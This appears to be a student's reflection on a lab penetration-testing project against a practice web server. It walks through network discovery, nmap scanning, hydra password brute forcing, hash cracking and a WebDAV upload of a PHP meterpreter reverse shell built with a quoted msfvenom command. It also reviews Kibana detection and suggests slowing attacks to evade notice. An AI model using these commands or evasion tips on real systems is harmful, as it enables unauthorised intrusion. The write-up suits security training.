# "How do you plan and execute an effective offensive engagement?"

### 1.  Restate the Problem

An effective offensive engagement has to determine vulnerabilities and exploit them.  Through this project, I was able to do just that. Unfortunately, the techniques used were easily logged to an ELK server where the target could see such an attack occurred and mitigate the damage as well as take that experience to harden their system from future similar attacks.

### 2.  Provide a Concrete Example Scenario

    -   In Project 2, which VMs were on the network? What was the purpose of each?
    -   Which of these VMs did you have to infiltrate?
    -   What was your goal in infiltrating each VM?
    -   Which tools did you use to perform the infiltration?
    -   What kinds of security measures, if any, were enabled on the network?


We had three virtual machines in this Red Team offensive against the Capstone Web Server. The attacker used a Kali Linux VM. The target was also running Linux as a web server.  The third virtual machine, running Linux, served as the ELK machine and sent data through Filebeat, Metricbeat, and Packetbeat to the Kibana SIEM interface to track and find events, including access to the web server by what should have been the unauthorized Kali VM.

One main goal of infiltrating the Capstone Web Server VM was gaining access and controlling the webserver through Metasploit. Metasploit is an integral tool for pentesters to enumerate networks, test security vulnerabilities, execute attacks, and evade detection. Inside Metasploit is a suite of tools that help a penetration tester scan and access its targets.

Since this was a project used to gain experience with infiltrating and then collecting data about that infiltration of the web server, there weren’t many security measures on the Capstone Web Server VM.  A Nmap scan revealed that only two ports were technically open, SSH and HTTP, but both are capable of being exploited. One could say simply having the Capstone Web Server sending information to Kibana provides some security as Kibana can provide valuable information about things like port scans and PUT requests of reverse shell scripts, but that does not prevent such things from happening.


### 3.  Explain the Solution Requirements

    -   How did you identify your targets?
    -   How did you identify vulnerabilities in each target, and which did you exploit?
    -   What did you do after infiltrating?
    
First, to identify the targets, I used the Kali Linux machine command line and ran ```netdiscover -r 192.168.1.255/16``` to see what other machines were on the network. This revealed three machines. The Remote Desktop used to run Hyper-V where the offensive would occur between the Kali Linux and the Webserver listed as 192.168.1.1. I also could see the ELK VM located at 192.168.1.100. Finally, I could see the Web Server at its IP location, 192.168.1.105. 
 
I then ran ```nmap -sS -A 192.168.1.105``` to get more information about the Capstone Web Server, which revealed that the web server had both ssh and http open and that the web server was running outdated Apache httpd 2.4.29. I could also see that the files were unencrypted and viewable.
 

Running ```firefox http://192.168.1.105``` opened the firefox browser, and I could then, since the directories were publicly available and unencrypted through http, begin reconnaissance work.


### 4.  Explain the Solution Details

    -   Which tools and commands did you use to identify your targets and their vulnerabilities?
    -   Which exploits did you use against these vulnerabilities, and how did you deliver them?
    -   How did you achieve your goal after infiltration?

Surveillance on the Capstone Web Server revealed user names and “secret” folders, and hydra was used to brute force passwords for the users that had rights to access the secret folder and its contents.

Not only that, but once inside the secret folder, another user’s hashed password was available.  This hash was easily cracked on crackstation.net. With those credentials, I could have full access to the web server’s WebDAV directory.

The WebDAV directory was not hardened to prevent uploads, and I then created a reverse shell script with the help of mfsvenom (```msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=4040 -f raw > rev-shell-2.php ```) that then was uploaded.

Once I loaded the .php reverse shell script, I accessed the Web Server machine through that “backdoor.” Running ```msfconsole``` and connecting through meterpreter was the mode I used to further search and exploit the Capstone Web Server.

### 5.  Identify Advantages and Disadvantages of the Solution

    -   Were your methods covert or detectable by monitoring solutions?

    -   How could you achieve your goal with greater stealth?

Unfortunately, when acting as a Blue Team defensive agent and using Kibana, it became apparent that these exploits were very easily detected with the data collected through Packetbeat and Filebeat. The Kibana SIEM interface has many visual cues, as well, that even if no alerts were pre-determined, it would be obvious that there is an increase in traffic. That increase in traffic usually indicates a dynamic offense against the VM being observed.

One way to do this using these same methods without easily being caught would be to slow the offense down.  If it were slowed way down, mainly when the brute force attack occurred and when the Port Scan occurred, the increase in traffic would not have been as noticeable.



